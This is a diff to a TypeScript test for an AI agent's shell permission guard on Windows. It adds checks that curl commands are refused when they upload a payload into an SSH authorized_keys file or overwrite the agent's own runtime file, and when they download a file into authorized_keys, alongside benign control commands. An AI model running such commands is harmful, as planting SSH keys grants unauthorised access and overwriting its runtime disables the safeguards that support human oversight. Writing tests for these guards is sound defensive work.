@@ -37,6 +37,8 @@ getPlatform.cache.set(undefined, 'windows')
 const floors = await import(join(SRC, 'utils/permissions/shellProtectedPaths.ts'))
 
 const readRefusal = (command: string): Promise<string | null> => floors.shellMercurySecretPath(command, false, PROJECT)
+const writeRefusal = (command: string): Promise<string | null> => floors.shellCredentialWritePath(command, false, PROJECT)
+const runtimeRefusal = (command: string): Promise<string | null> => floors.shellSelfProtectionReason(command, false, PROJECT)
 
 console.log('============================================================')
 console.log(' on Windows the credential read floor reads a file: URL that names a drive path')
@@ -97,6 +99,49 @@ section('§5 controls')
     const refusal = await readRefusal(command)
     check(`${JSON.stringify(command)} (a file of the project, ${why}) · not refused`, refusal === null, String(refusal))
   }
+}
+
+const WIN_KEYS = 'C:/Users/operator/.ssh/authorized_keys'
+const WIN_KEYS_BS = 'C:\\Users\\operator\\.ssh\\authorized_keys'
+const WIN_RUNTIME = 'C:/src/fl110/holder/.mercury/runtime/current/mercury.mjs'
+
+section('§6 curl -T / --upload-file to a file: URL with a drive path')
+for (const [head, why] of FORMS) {
+  const toKeys = `curl -T payload ${head}${WIN_KEYS}`
+  check(`${JSON.stringify(toKeys)} (${why}) · refused by credential-write floor`, (await writeRefusal(toKeys)) !== null, 'not refused')
+  const toRuntime = `curl --upload-file payload ${head}${WIN_RUNTIME}`
+  check(`${JSON.stringify(toRuntime)} (${why}) · refused by self-protection floor`, (await runtimeRefusal(toRuntime)) !== null, 'not refused')
+}
+for (const [head, why] of OTHER_FORMS) {
+  const toKeys = `curl -T payload '${head}/Users/operator/.ssh/authorized_keys'`
+  check(`${JSON.stringify(toKeys)} (${why}) · refused by credential-write floor`, (await writeRefusal(toKeys)) !== null, 'not refused')
+  const toRuntime = `curl --upload-file payload '${head}/src/fl110/holder/.mercury/runtime/current/mercury.mjs'`
+  check(`${JSON.stringify(toRuntime)} (${why}) · refused by self-protection floor`, (await runtimeRefusal(toRuntime)) !== null, 'not refused')
+}
+{
+  const backslashed = `curl -T payload 'file:///${WIN_KEYS_BS}'`
+  check(`${JSON.stringify(backslashed)} · refused by credential-write floor`, (await writeRefusal(backslashed)) !== null, 'not refused')
+}
+
+section('§7 curl -o / --output to a credential store on Windows')
+for (const command of [
+  `curl -o ${WIN_KEYS} https://example.invalid/k`,
+  `curl --output '${WIN_KEYS_BS}' https://example.invalid/k`,
+  `curl --output=${SLASHED} https://example.invalid/k`,
+]) {
+  check(`${JSON.stringify(command)} · refused by credential-write floor`, (await writeRefusal(command)) !== null, 'not refused')
+}
+
+section('§8 controls for curl writes on Windows')
+for (const command of [
+  'curl -T payload https://example.com/x',
+  'curl -o notes.txt https://example.invalid/x',
+  'curl -T payload file://C:/src/fl110/project/notes.txt',
+  'curl file://C:/src/fl110/project/notes.txt',
+]) {
+  const wHit = await writeRefusal(command)
+  const rHit = await runtimeRefusal(command)
+  check(`${JSON.stringify(command)} · neither write nor runtime floor refuses`, wHit === null && rHit === null, `write=${String(wHit)} runtime=${String(rHit)}`)
 }
 
 Object.defineProperty(process, 'platform', descriptor)
